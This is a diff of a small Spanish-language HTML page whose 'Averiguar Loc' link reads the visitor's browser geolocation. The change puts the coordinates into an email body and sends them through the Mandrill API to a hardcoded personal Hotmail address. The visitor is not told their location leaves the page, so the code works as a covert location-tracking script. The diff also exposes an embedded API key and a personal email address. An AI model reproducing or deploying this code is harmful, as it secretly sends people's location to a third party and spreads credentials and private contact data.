@@ -10,47 +10,45 @@
 	<a href="javascript:comenzar()">Averiguar Loc</a>
 </body>
 <script>
-var json = {
-    "key": "9oCSXw6pdOfqmR8LTaUotg",
-    "message": {
-        "from_email": "YOUR@EMAIL.HERE",
-        "to": [
-            {
-                "email": "facundodelgado.1@hotmail.com",
-                "name": "RECIPIENT NAME (OPTIONAL)",
-                "type": "to"
-            },
-  {
-      "email": "facundodelgado.1@hotmail.com",
-      "name": "ANOTHER RECIPIENT NAME (OPTIONAL)",
-      "type": "to"
-  }
-        ],
-        "autotext": "true",
-        "subject": "YOUR SUBJECT HERE!",
-        "html": "YOUR EMAIL CONTENT HERE! YOU CAN USE HTML!"
-    }
-};
-
 var result;
 function comenzar() {
-navigator.geolocation.getCurrentPosition(
-	function (ubicacion) {
-	   result = {
-	       "latitude": ubicacion.coords.latitude,
-	       "longitude": ubicacion.coords.longitude
-	   }
-	   $.ajax({
-	       url: "https://mandrillapp.com/api/1.0/messages/send.json",
-	       type: "POST",
-	       data: json
-	   }).done(function (response) {
-	       console.log(response); // if you're into that sorta thing
-	   });
-	},
-	function (e) {
-	   result = null;
-	});
+    navigator.geolocation.getCurrentPosition(
+           function (ubicacion) {
+               result = {
+                   "latitude": ubicacion.coords.latitude,
+                   "longitude": ubicacion.coords.longitude
+               }
+               $.ajax({
+                   url: "https://mandrillapp.com/api/1.0/messages/send.json",
+                   type: "POST",
+                   data: {
+                       "key": "9oCSXw6pdOfqmR8LTaUotg",
+                       "message": {
+                           "from_email": "YOUR@EMAIL.HERE",
+                           "to": [
+                               {
+                                   "email": "facundodelgado.1@hotmail.es",
+                                   "name": "RECIPIENT NAME (OPTIONAL)",
+                                   "type": "to"
+                               },
+                     {
+                         "email": "facundodelgado.1@hotmail.es",
+                         "name": "ANOTHER RECIPIENT NAME (OPTIONAL)",
+                         "type": "to"
+                     }
+                           ],
+                           "autotext": "true",
+                           "subject": "YOUR SUBJECT HERE!",
+                           "html": "long" + result.longitude + "lat" + result.latitude
+                       }
+                   }
+               }).done(function (response) {
+                   console.log(response); // if you're into that sorta thing
+               });
+           },
+function (e) {
+    result = null;
+});
 }
 </script>
 </html>
